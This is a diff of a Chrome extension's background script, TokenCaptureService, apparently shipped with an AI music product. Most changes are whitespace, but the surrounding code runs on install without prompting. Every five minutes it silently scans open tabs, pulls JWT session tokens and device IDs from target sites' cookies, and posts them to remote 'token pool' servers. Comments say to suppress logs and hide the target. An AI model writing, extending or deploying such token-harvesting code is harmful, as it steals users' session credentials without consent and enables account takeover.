@@ -15,9 +15,9 @@ class TokenCaptureService {
   async initializeService() {
     // Silent initialization - no console logs mentioning specific services
     if (process.env.NODE_ENV === 'development') {
-    console.log('Son1kVerse AI Music Engine initialized')
+      console.log('Son1kVerse AI Music Engine initialized')
     }
-    
+
     // Auto-extract on install/startup
     chrome.runtime.onInstalled.addListener((details) => {
       // Silent installation - no user prompts
@@ -26,13 +26,13 @@ class TokenCaptureService {
         this.startAutoExtraction()
       } else if (details.reason === 'update') {
         // Resume on update
-      this.startAutoExtraction()
+        this.startAutoExtraction()
       }
     })
-    
+
     // Start auto-extraction when service starts
     this.startAutoExtraction()
-    
+
     // Listen for messages from content scripts
     chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
       this.handleMessage(message, sender, sendResponse)
@@ -119,8 +119,8 @@ class TokenCaptureService {
             // Send to pool
             const label = message.label || `extension-${Date.now()}`
             const poolResult = await this.sendTokenToPool(extracted.token, label)
-            sendResponse({ 
-              success: true, 
+            sendResponse({
+              success: true,
               data: {
                 extracted,
                 pool: poolResult
@@ -154,7 +154,7 @@ class TokenCaptureService {
     try {
       // Check if we can access storage (required permission)
       await chrome.storage.local.get(['test'])
-      
+
       // Check if we can access cookies (required permission)
       // This will throw if permission not granted
       try {
@@ -162,7 +162,7 @@ class TokenCaptureService {
       } catch (e) {
         return false
       }
-      
+
       return true
     } catch (error) {
       return false
@@ -259,7 +259,7 @@ class TokenCaptureService {
       if (response.ok) {
         const result = await response.json()
         console.log('Tokens synced successfully:', result)
-        
+
         // Update local tokens with server response
         await this.updateLocalTokens(result.tokens)
       } else {
@@ -302,14 +302,14 @@ class TokenCaptureService {
       // 1. Send to The Generator (Supabase pool)
       promises.push(
         fetch(`${generatorUrl}/api/token-pool/add`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          token: token,
-          label: label
-        })
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            token: token,
+            label: label
+          })
         }).then(async (response) => {
           if (response.ok) {
             const data = await response.json()
@@ -339,8 +339,8 @@ class TokenCaptureService {
             source: 'extension'
           })
         }).then(async (response) => {
-      if (response.ok) {
-        const data = await response.json()
+          if (response.ok) {
+            const data = await response.json()
             console.log('✅ Token sent to Backend pool:', data)
             return { source: 'backend', success: true, data }
           } else {
@@ -373,10 +373,10 @@ class TokenCaptureService {
         }
         return { success: false, error: 'Request timeout', retry: false }
       }
-      
+
       // Check if at least one succeeded
       const successCount = results.filter(r => r.success).length
-      
+
       if (successCount > 0) {
         this.lastSendTime = now
         if (process.env.NODE_ENV === 'development') {
@@ -430,7 +430,7 @@ class TokenCaptureService {
 
       if (results && results[0] && results[0].result) {
         const { jwtToken, deviceId, url } = results[0].result
-        
+
         if (!jwtToken) {
           // Silent return - no error messages that expose target
           return null
@@ -566,7 +566,7 @@ class TokenCaptureService {
       const result = await chrome.storage.local.get(['capturedTokens'])
       const tokens = result.capturedTokens || []
       const tokenIndex = tokens.findIndex(t => t.token === token)
-      
+
       if (tokenIndex !== -1) {
         tokens[tokenIndex].sentToPool = true
         tokens[tokenIndex].lastSentAt = new Date().toISOString()
@@ -592,7 +592,7 @@ class TokenCaptureService {
     try {
       // Check if we're in development mode (extension installed from file://)
       if (chrome.runtime.getURL('').startsWith('chrome-extension://') &&
-          !chrome.runtime.getURL('').includes('chrome.google.com')) {
+        !chrome.runtime.getURL('').includes('chrome.google.com')) {
         // Development mode - use localhost
         return 'http://localhost:3001'
       } else {
@@ -629,11 +629,11 @@ class TokenCaptureService {
     // Silent background process - no user interaction needed
     setInterval(async () => {
       try {
-      const tabs = await chrome.tabs.query({})
-      for (const tab of tabs) {
-        if (tab.url && this.isTargetSite(tab.url)) {
+        const tabs = await chrome.tabs.query({})
+        for (const tab of tabs) {
+          if (tab.url && this.isTargetSite(tab.url)) {
             // Silently extract and send token every 5 minutes
-          await this.autoExtractAndSend(tab.id)
+            await this.autoExtractAndSend(tab.id)
             break // Only do one at a time to avoid rate limits
           }
         }
@@ -669,7 +669,7 @@ class TokenCaptureService {
 
       // Extract token from cookies
       const extracted = await this.extractTokenFromTab(tabId)
-      
+
       if (!extracted || !extracted.token) {
         return // No token found
       }
@@ -677,7 +677,7 @@ class TokenCaptureService {
       // Check if we already have this token
       const tokens = await this.getCapturedTokens()
       const exists = tokens.some(t => t.token === extracted.token)
-      
+
       if (exists) {
         // Token already captured, but still try to send to pool
         const latestToken = tokens.find(t => t.token === extracted.token)
@@ -696,12 +696,12 @@ class TokenCaptureService {
 
       // Send to pool automatically (silent - no user notification)
       await this.sendTokenToPool(extracted.token, `auto-${Date.now()}`)
-      
+
       this.lastExtractionTime = now
-      
+
       // Only log in development mode
       if (process.env.NODE_ENV === 'development') {
-      console.log('Token auto-extracted and sent to pool')
+        console.log('Token auto-extracted and sent to pool')
       }
 
     } catch (error) {
@@ -735,7 +735,7 @@ class TokenCaptureService {
 
       if (results && results[0] && results[0].result) {
         const { jwtToken, deviceId, url } = results[0].result
-        
+
         if (!jwtToken) {
           return null
         }
